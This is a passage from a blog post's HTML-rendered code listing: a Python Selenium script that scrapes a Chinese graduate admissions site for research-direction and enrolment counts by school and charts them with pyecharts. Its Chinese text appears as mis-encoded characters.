print(empty)</span><br><span class=\"line\"></span><br><span class=\"line\">        driver.close()</span><br><span class=\"line\">        driver.quit()</span><br><span class=\"line\">        <span class=\"comment\"># print(school_list, major_numbers_list, number_list)</span></span><br><span class=\"line\">        <span class=\"comment\"># ['é»‘é¾™æ±Ÿå¤§å­¦', 'å“ˆå°”æ»¨å·¥ä¸šå¤§å­¦', 'å“ˆå°”æ»¨ç†å·¥å¤§å­¦', 'å“ˆå°”æ»¨å·¥ç¨‹å¤§å­¦', 'é»‘é¾™æ±Ÿç§‘æŠ€å¤§å­¦', 'ä¸œåŒ—çŸ³æ²¹å¤§å­¦', 'é»‘é¾™æ±Ÿå…«ä¸€å†œå¦å¤§å­¦', 'ä¸œåŒ—æ—ä¸šå¤§å­¦', 'å“ˆå°”æ»¨å¸ˆèŒƒå¤§å­¦', 'é½é½å“ˆå°”å¤§å­¦']</span></span><br><span class=\"line\">        <span class=\"comment\">#  [8, 21, 15, 59, 6, 10, 2, 3, 10, 6]</span></span><br><span class=\"line\">        <span class=\"comment\">#  [78, 1549, 123, 201, 153, 149, 331, 221, 115, 520]</span></span><br><span class=\"line\"></span><br><span class=\"line\">        print(<span class=\"string\">\"æ­£åœ¨å‡†å¤‡ç»˜åˆ¶å›¾è¡¨...\"</span>)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> school_name_list, major_numbers_list, number_list, flag</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">stacked_area_chart</span><span class=\"params\">(self, x_data, y1_data, y2_data, flag)</span>:</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span>(flag):</span><br><span class=\"line\">            (</span><br><span class=\"line\">                Line()</span><br><span class=\"line\">                    .add_xaxis(xaxis_data=x_data)</span><br><span class=\"line\">                    .add_yaxis(</span><br><span class=\"line\">                    series_name=<span class=\"string\">\"ç ”ç©¶æ–¹å‘æ•°é‡\"</span>,</span><br><span class=\"line\">                    stack=<span class=\"string\">\"æ€»é‡\"</span>,</span><br><span class=\"line\">                    y_axis=y1_data,</span><br><span class=\"line\">                    areastyle_opts=opts.AreaStyleOpts(opacity=<span class=\"number\">0.5</span>),</span><br><span class=\"line\">                    label_opts=opts.LabelOpts(is_show=<span class=\"literal\">False</span>),</span><br><span class=\"line\">                )</span><br><span class=\"line\">                    .add_yaxis(</span><br><span class=\"line\">                    series_name=<span class=\"string\">\"æ‹Ÿæ‹›ç”Ÿäººæ•°\"</span>,</span><br><span class=\"line\">                    stack=<span class=\"string\">\"æ€»é‡\"</span>,</span><br><span class=\"line\">                    y_axis=y2_data,</span><br><span class=\"line\">                    areastyle_opts=opts.AreaStyleOpts(opacity=<span class=\"number\">0.5</span>),</span><br><span class=\"line\">                    label_opts=opts.LabelOpts(is_show=<span class=\"literal\">False</span>),</span><br><span class=\"line\">                )</span><br><span class=\"line\"></span><br><span class=\"line\">                    .set_global_opts(</span><br><span class=\"line\">                    title_opts=opts.TitleOpts(title=<span class=\"string\">\"é«˜æ ¡ç ”ç©¶æ–¹å‘æŠ˜çº¿å›¾\"</span>),</span><br><span class=\"line\">                    tooltip_opts=opts.TooltipOpts(trigger=<span class=\"string\">\"axis\"</span>, axis_pointer_type=<span class=\"string\">\"cross\"</span>),</span><br><span class=\"line\">                    yaxis_opts=opts.AxisOpts(</span><br><span class=\"line\">                        type_=<span class=\"string\">\"value\"</span>,</span><br><span class=\"line\">                        axistick_opts=opts.AxisTickOpts(is_show=<span class=\"literal\">True</span>),</span><br><span class=\"line\">                        splitline_opts=opts.SplitLineOpts(is_show=<span class=\"literal\">True</span>),</span><br><span class=\"line\">                    ),</span><br><span class=\"line\"></span><br><span class=\"line\">                    xaxis_opts=opts.AxisOpts(type_=<span class=\"string\">\"category\"</span>, boundary_gap=<span class=\"literal\">False</span>, name_rotate=<span class=\"number\">60</span>, name_gap=<span class=\"number\">20</span>),</span><br><span class=\"line\">                )</span><br><span class=\"line\">                    .render(<span class=\"string\">\"ReserachDirections.html\"</span>)</span><br><span class=\"line\">            )</span><br><span class=\"line\">            print(<span class=\"string\">\"ç»˜åˆ¶æˆåŠŸï¼Œè¯·åœ¨åŒçº§ç›®å½•ä¸‹æŸ¥çœ‹ ReserachDirections.html æ–‡ä»¶ï¼\"</span>)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"å‡ºç°é”™è¯¯ï¼Œåœæ­¢ç»˜åˆ¶å›¾è¡¨ï¼\"</span>)</span><br></pre></td></tr></table></figure>\n\n<p><strong>RDsBySchoolName.py</strong></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># encoding: utf-8</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">@author: Brian</span></span><br><span class=\"line\"><span class=\"string\">@file: RDsBySchoolName.py</span></span><br><span class=\"line\"><span class=\"string\">@time: 2020/7/1 14:20</span></span><br><span class=\"line\"><span class=\"string\">@desc: é€šè¿‡å­¦æ ¡åå­—æ¥è·å¾—ç›¸å…³ä¿¡æ¯</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> selenium <span class=\"keyword\">import</span> webdriver</span><br><span class=\"line\"><span class=\"keyword\">from</span> selenium.webdriver.chrome.options <span class=\"keyword\">import</span> Options</span><br><span class=\"line\"><span class=\"keyword\">from</span> selenium.webdriver.support.ui <span class=\"keyword\">import</span> Select</span><br><span class=\"line\"><span class=\"keyword\">from</span> selenium.webdriver.common.keys <span class=\"keyword\">import</span> Keys</span><br><span class=\"line\"><span class=\"keyword\">from</span> pyecharts.charts <span class=\"keyword\">import</span> Line</span><br><span class=\"line\"><span class=\"keyword\">from</span> pyecharts.charts <span class=\"keyword\">import</span> Bar</span><br><span class=\"line\"><span class=\"keyword\">from</span> pyecharts <span class=\"keyword\">import</span> options <span class=\"keyword\">as</span> opts</span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">RDsBySchoolName</span><span class=\"params\">(object)</span>:</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span><span class=\"params\">(self, url, schoolname, yjxkdm)</span>:</span></span><br><span class=\"line\">        self.url = url</span><br><span class=\"line\">        self.schoolname = schoolname</span><br><span class=\"line\">        self.yjxkdm = yjxkdm</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># é…ç½® driver</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">set_driver</span><span class=\"params\">(self)</span>:</span></span><br><span class=\"line\">        chrome_options = Options()</span><br><span class=\"line\">        chrome_options.add_argument(<span class=\"string\">\"--headless\"</span>)</span><br><span class=\"line\">        chrome_options.add_argument(<span class=\"string\">\"--disable-gpu\"</span>)</span><br><span class=\"line\">        driver = webdriver.Chrome(executable_path=<span class=\"string\">\"E:/Program Files/chromedriver_win32/chromedriver.exe\"</span>,</span><br><span class=\"line\">                                  chrome_options=chrome_options)</span><br><span class=\"line\">        driver.get(self.url)</span><br><span class=\"line\">        driver = self.set_height_width(driver)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> driver</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># å°†è®¾ç½®å±å¹•å¤§å°ç‹¬ç«‹å‡ºæ¥ï¼Œæ–¹ä¾¿æ¯æ¬¡è·³è½¬å®Œä½¿ç”¨</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">set_height_width</span><span class=\"params\">(self, driver)</span>:</span></span><br><span class=\"line\">        width = driver.execute_script(<span class=\"string\">\"return document.documentElement.scrollWidth\"</span>)</span><br><span class=\"line\">        height = driver.execute_script(<span class=\"string\">\"return document.documentElement.scrollHeight\"</span>)</span><br><span class=\"line\">        driver.set_window_size(width, height)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> driver</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># å¦‚æœéœ€è¦ç¿»é¡µå°±ç¿»é¡µ</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">paging</span><span class=\"params\">(self, driver)</span>:</span></span><br><span class=\"line\">        ul = driver.find_element_by_xpath(<span class=\"string\">\"//ul[@class='ch-page']\"</span>)</span><br><span class=\"line\">        li = ul.find_elements_by_xpath(<span class=\"string\">\"li\"</span>)</span><br><span class=\"line\">        <span class=\"comment\"># print(\"å½“å‰é¡µé¢ç¿»é¡µå…ƒç´ é•¿åº¦ï¼š\" + str(len(li)))</span></span><br><span class=\"line\">        <span class=\"comment\"># ç¬¬ä¸€é¡µå³ä¸‹è§’çš„æ ‡ç­¾æ•°é‡æœ€å¤§ä¸º10ï¼Œå°äº10æ—¶æ²¡æœ‰ Go è¾“å…¥è·³è½¬æ¡†</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span>(len(li) &lt; <span class=\"number\">10</span>):</span><br><span class=\"line\">            pagenumber = int(li[<span class=\"number\">-2</span>].text)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            pagenumber = int(li[<span class=\"number\">-3</span>].text)</span><br><span class=\"line\">        <span class=\"comment\"># print(\"å½“å‰é¡µé¢é¡µæ•°ï¼š\" + str(pagenumber))</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> pagenumber</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># é€šè¿‡å­¦æ ¡åä¸ä¸“ä¸šé€‰æ‹©å­¦æ ¡</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">select_school</span><span class=\"params\">(self, driver,)</span>:</span></span><br><span class=\"line\">        <span class=\"comment\"># ä¸“ä¸šåˆ—è¡¨,ç ”ç©¶æ–¹å‘æ•°é‡åˆ—è¡¨ï¼Œæ‹Ÿæ‹›ç”Ÿäººæ•°åˆ—è¡¨</span></span><br><span class=\"line\">        label_list = []</span><br><span class=\"line\">        major_number_list = []</span><br><span class=\"line\">        admission_list = []</span><br><span class=\"line\">        original_window = driver.current_window_handle</span><br><span class=\"line\">        flag = <span class=\"literal\">True</span></span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            driver.find_element_by_xpath(<span class=\"string\">\"//input[@id='dwmc']\"</span>).send_keys(self.schoolname)</span><br><span class=\"line\">            Select(driver.find_element_by_xpath(<span class=\"string\">\"//select[@id='yjxkdm']\"</span>)).select_by_value(self.yjxkdm)</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\"># æ‰¾åˆ°æŸ¥è¯¢æŒ‰é’®è¿›è¡Œç‚¹å‡»,è¿›å…¥é«˜æ ¡åˆ—è¡¨ç•Œé¢</span></span><br><span class=\"line\">            <span class=\"comment\"># ç‚¹å‡»å®Œè¿˜æ˜¯åœ¨ä¸€ä¸ª tab é‡Œï¼Œ handle ä¹Ÿä¸€æ ·</span></span><br><span class=\"line\">            driver.find_element_by_xpath(<span class=\"string\">\"//input[@name='button']\"</span>).click()</span><br><span class=\"line\"></span><br><span class=\"line\">            school_name = driver.find_element_by_xpath(<span class=\"string\">\"//tr[1]//td[1]//form[1]//a[1]\"</span>).get_attribute(</span><br><span class=\"line\">                <span class=\"string\">\"textContent\"</span>)</span><br><span class=\"line\">            print(school_name)</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\"># è·³è½¬åˆ°æ¯ä¸ªå­¦æ ¡å¯¹åº”çš„ç ”ç©¶æ–¹å‘ä¿¡æ¯é¡µé¢</span></span><br><span class=\"line\">            driver.find_element_by_link_text(school_name).click()</span><br><span class=\"line\">            <span class=\"keyword\">for</span> window_handle <span class=\"keyword\">in</span> driver.window_handles:</span><br><span class=\"line\">                <span class=\"keyword\">if</span> window_handle != original_window:</span><br><span class=\"line\">                    driver.switch_to.window(window_handle)</span><br><span class=\"line\">                    <span class=\"keyword\">break</span></span><br><span class=\"line\">            driver = self.set_height_width(driver)</span><br><span class=\"line\"></span><br><span class=\"line\">            label_list, major_number_list, admission_list = self.get_major_list(driver)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">except</span>:</span><br><span class=\"line\">            flag = <span class=\"literal\">False</span></span><br><span class=\"line\">            print(<span class=\"string\">\"é€‰æ‹©æ¡ä»¶å‡ºç°é”™è¯¯ï¼Œè¯·æ£€æŸ¥å­¦æ ¡åç§°ä¸å­¦ç§‘ç±»åˆ«ä»£ç æ˜¯å¦æ­£ç¡®ï¼Œæˆ–æ˜¯è¯¥é™¢æ ¡æœªå¼€è®¾è¯¥ä¸“ä¸šï¼ç¨‹åºå³å°†é€€å‡º...\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        driver.close()</span><br><span class=\"line\">        driver.quit()</span><br><span class=\"line\">        <span class=\"keyword\">return</span> label_list, major_number_list, admission_list, flag</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_major_list</span><span class=\"params\">(self, driver)</span>:</span></span><br><span class=\"line\">        major_number_list = []</span><br><span class=\"line\">        admission_list = []</span><br><span class=\"line\">        label_list = []</span><br><span class=\"line\">        value_list = []</span><br><span class=\"line\"></span><br><span class=\"line\">        ul = driver.find_element_by_xpath(<span class=\"string\">\"//ul[@class='zsml-zy-filter']\"</span>)</span><br><span class=\"line\">        li = ul.find_elements_by_xpath(<span class=\"string\">\"li\"</span>)</span><br><span class=\"line\">        print(<span class=\"string\">\"å½“å‰é™¢æ ¡ä¸“ä¸šæ•°é‡ï¼š\"</span> + str(len(li)))</span><br><span class=\"line\"></span><br><span class=\"line\">        input_selector = <span class=\"string\">\"/html[1]/body[1]/div[2]/div[3]/div[1]/div[2]/div[2]/form[1]/ul[1]/li[&#123;&#125;]/input[1]\"</span></span><br><span class=\"line\">        label_selector = <span class=\"string\">\"/html[1]/body[1]/div[2]/div[3]/div[1]/div[2]/div[2]/form[1]/ul[1]/li[&#123;&#125;]/label[1]\"</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> check_box <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>, len(li)+<span class=\"number\">1</span>):</span><br><span class=\"line\">            <span class=\"keyword\">try</span>:</span><br><span class=\"line\">                value = driver.find_element_by_xpath(input_selector.format(check_box)).get_attribute(<span class=\"string\">\"value\"</span>)</span><br><span class=\"line\">                label = driver.find_element_by_xpath(label_selector.format(check_box)).get_attribute(<span class=\"string\">\"textContent\"</span>)</span><br><span class=\"line\">                driver.find_element_by_xpath(input_selector.format(check_box)).click()</span><br><span class=\"line\">                driver.find_element_by_xpath(<span class=\"string\">\"//input[@class='blue-btn-s']\"</span>).click()</span><br><span class=\"line\">                label_list.append(label)</span><br><span class=\"line\">                value_list.append(value)</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"comment\"># å¾—åˆ°æ¯ä¸ªä¸“ä¸šä¸‹çš„ç ”ç©¶æ–¹å‘æ•°é‡ä¸æ‹Ÿæ‹›ç”Ÿäººæ•°</span></span><br><span class=\"line\">                majors, all_number = self.get_major_info(driver)</span><br><span class=\"line\">                major_number_list.append(majors)</span><br><span class=\"line\">                admission_list.append(all_number)</span><br><span class=\"line\"></span><br><span class=\"line\">                print(<span class=\"string\">\" å½“å‰ä¸“ä¸šï¼š\"</span> + label)</span><br><span class=\"line\">                print(<span class=\"string\">\" ç ”ç©¶æ–¹å‘æ•°é‡ï¼š \"</span> + str(majors), <span class=\"string\">\"æ‹Ÿæ‹›ç”Ÿäººæ•°ï¼š \"</span> + str(all_number))</span><br><span class=\"line\">                <span class=\"comment\"># ä¸¤æ¬¡ç‚¹å‡»å–æ¶ˆé€‰æ‹©</span></span><br><span class=\"line\">                driver.find_element_by_xpath(input_selector.format(check_box)).click()</span><br><span class=\"line\">                driver.find_element_by_xpath(<span class=\"string\">\"//input[@class='blue-btn-s']\"</span>).click()</span><br><span class=\"line\">            <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">                print(e)</span><br><span class=\"line\">        print(value_list, label_list)</span><br><span class=\"line\">        print(major_number_list, admission_list)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> label_list, major_number_list, admission_list</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># å¾—åˆ°ç ”ç©¶æ–¹å‘æ•°é‡ä¸æ‹Ÿæ‹›ç”Ÿäººæ•°</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_major_info</span><span class=\"params\">(self, driver)</span>:</span></span><br><span class=\"line\">        <span class=\"comment\"># å½“å‰ Tab é‡Œæœ‰å¤šå°‘ä¸ªé¡µé¢</span></span><br><span class=\"line\">        pagenumber = self.paging(driver)</span><br><span class=\"line\">        majors = <span class=\"number\">0</span></span><br><span class=\"line\">        all_number = <span class=\"number\">0</span></span><br><span class=\"line\">        <span class=\"comment\"># å®šä½è·³è½¬</span></span><br><span class=\"line\">        css_selector_jumpto = <span class=\"string\">\"body.ch-sticky:nth-child(2) \"</span> \\</span><br><span class=\"line\">                              <span class=\"string\">\"div.main-wrapper:nth-child(2) \"</span> \\</span><br><span class=\"line\">                              <span class=\"string\">\"div.container.clearfix:nth-child(5) \"</span> \\</span><br><span class=\"line\">                              <span class=\"string\">\"div.zsml-row.clearfix \"</span> \\</span><br><span class=\"line\">                              <span class=\"string\">\"div.zsml-page-box ul.ch-page \"</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (pagenumber == <span class=\"number\">1</span>):</span><br><span class=\"line\">            <span class=\"comment\"># ä¸ç”¨ä¸‹ä¸€é¡µæ“ä½œ</span></span><br><span class=\"line\">            major = driver.find_elements_by_xpath(<span class=\"string\">\"//tbody//tr\"</span>)</span><br><span class=\"line\">            majors += len(major)</span><br><span class=\"line\">            <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>, len(major) + <span class=\"number\">1</span>):</span><br><span class=\"line\">                <span class=\"keyword\">try</span>:</span><br><span class=\"line\">                    number = driver.find_element_by_xpath(<span class=\"string\">\"//tr[&#123;&#125;]//td[7]//a[1]\"</span>.format(i)).get_attribute(<span class=\"string\">\"data-title\"</span>)</span><br><span class=\"line\">                    numbers = re.sub(<span class=\"string\">r\"[^0-9]\"</span>, <span class=\"string\">\"\"</span>, number)</span><br><span class=\"line\">                    all_number += int(numbers)</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">                    print(e)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"comment\"># æ‰¾åˆ°ä¸‹ä¸€é¡µæŒ‰é’®</span></span><br><span class=\"line\">            <span class=\"keyword\">while</span> (pagenumber):</span><br><span class=\"line\">                <span class=\"keyword\">try</span>:</span><br><span class=\"line\">                    major = driver.find_elements_by_xpath(<span class=\"string\">\"//tbody//tr\"</span>)</span><br><span class=\"line\">                    <span class=\"comment\"># print(\"è¿™ä¸€é¡µçš„ç ”ç©¶æ–¹å‘æ•°é‡\" + str(len(major)))</span></span><br><span class=\"line\">                    majors += len(major)</span><br><span class=\"line\">                    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>, len(major) + <span class=\"number\">1</span>):</span><br><span class=\"line\">                        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">                            number = driver.find_element_by_xpath(<span class=\"string\">\"//tr[&#123;&#125;]//td[7]//a[1]\"</span>.format(i)).get_attribute(</span><br><span class=\"line\">                                <span class=\"string\">\"data-title\"</span>)</span><br><span class=\"line\">                            numbers = re.sub(<span class=\"string\">r\"[^0-9]\"</span>, <span class=\"string\">\"\"</span>, number)</span><br><span class=\"line\">                            <span class=\"comment\"># print(\"  æ‹Ÿæ‹›ç”Ÿï¼š\" + numbers)</span></span><br><span class=\"line\">                            all_number += int(numbers)</span><br><span class=\"line\">                        <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">                            print(e)</span><br><span class=\"line\">                <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">                    print(e)</span><br><span class=\"line\">                ul = driver.find_element_by_css_selector(css_selector_jumpto)</span><br><span class=\"line\">                li = ul.find_elements_by_xpath(<span class=\"string\">\"li\"</span>)</span><br><span class=\"line\">                li[<span class=\"number\">-1</span>].click()</span><br><span class=\"line\">                pagenumber -= <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> majors, all_number</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># æ•°æ®å¯è§†åŒ–</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">stacked_area_chart</span><span class=\"params\">(self, x_data, y1_data, y2_data, flag)</span>:</span></span><br><span class=\"line\">        schoolname = self.schoolname</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(flag):</span><br><span class=\"line\">            (</span><br><span class=\"line\">                Bar()</span><br><span class=\"line\">                    .add_xaxis(xaxis_data=x_data)</span><br><span class=\"line\">                    .add_yaxis(<span class=\"string\">\"ä¸“ä¸šä¸‹ç ”ç©¶æ–¹å‘æ•°é‡\"</span>, y1_data)</span><br><span class=\"line\">                    .add_yaxis(<span class=\"string\">\"å„ä¸“ä¸šæ‹Ÿæ‹›ç”Ÿäººæ•°\"</span>, y2_data)</span><br><span class=\"line\">                    .set_global_opts(</span><br><span class=\"line\">                    xaxis_opts=opts.AxisOpts(axislabel_opts=opts.LabelOpts(rotate=<span class=\"number\">-15</span>)),</span><br><span class=\"line\">                    title_opts=opts.TitleOpts(title=schoolname + <span class=\"string\">\"ä¸“ä¸šä¿¡æ¯æŠ˜çº¿å›¾\"</span>, subtitle=<span class=\"string\">\"ä¸‹å±ç ”ç©¶æ–¹å‘ä¸æ‹Ÿæ‹›ç”Ÿäººæ•°\"</span>),</span><br><span class=\"line\">                )</span><br><span class=\"line\">                    .render(<span class=\"string\">\"ReserachDirections.html\"</span>)</span><br><span class=\"line\">            )</span><br><span class=\"line\">            print(<span class=\"string\">\"ç»˜åˆ¶æˆåŠŸï¼Œè¯·åœ¨åŒçº§ç›®å½•ä¸‹æŸ¥çœ‹ ReserachDirections.html æ–‡ä»¶ï¼\"</span>)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"å‡ºç°é”™è¯¯ï¼Œåœæ­¢ç»˜åˆ¶å›¾è¡¨ï¼\"</span>)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"å‚è€ƒé“¾æ¥\"><a href=\"#å‚è€ƒé“¾æ¥\" class=\"headerlink\" title=\"å‚è€ƒé“¾æ¥\"></a>å‚è€ƒé“¾æ¥</h2><p><a href=\"https://blog.csdn.net/J080624/article/details/84171917\" target=\"_blank\" rel=\"noopener\">AJAX-XMLHtppRequest çš„å‰ä¸–ä»Šç”Ÿ</a></p>\n<p><a href=\"https://blog.csdn.net/qq_33689414/article/details/78631009\" target=\"_blank\" rel=\"noopener\">Seleniumå’ŒPhantomJSä»‹ç»</a></p>\n<p><a href=\"https://programmer.group/python-crawler-8-selenium-and-phantomjs-for-dynamic-html-processing.html\" target=\"_blank\" rel=\"noopener\">Pyhonçˆ¬è™«æ•™ç¨‹</a></p>\n<p><a href=\"http://pyecharts.org/#/zh-cn/intro\" target=\"_blank\" rel=\"noopener\">pyechartså®˜ç½‘</a></p>\n","text":"ä½¿ç”¨ Selenium 